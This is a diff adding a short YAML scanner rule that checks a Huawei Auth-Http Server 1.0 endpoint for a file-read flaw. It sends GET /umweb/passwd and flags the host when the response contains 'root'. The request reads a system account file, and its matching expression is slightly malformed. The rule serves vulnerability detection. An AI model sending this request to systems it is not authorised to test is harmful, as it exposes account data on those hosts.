@@ -1,0 +1,10 @@
+name: 华为Auth-Http Server 1.0文件读取
+rules:
+    - method: GET
+      path: /umweb/passwd
+  
+      headers: {}
+      expression: response.status == 200 && contains_all(body,"root") && response.body.bcontains(b,"root")
+detail:
+    cve-id: huawei-auth-http-server-fileread
+    severity: medium
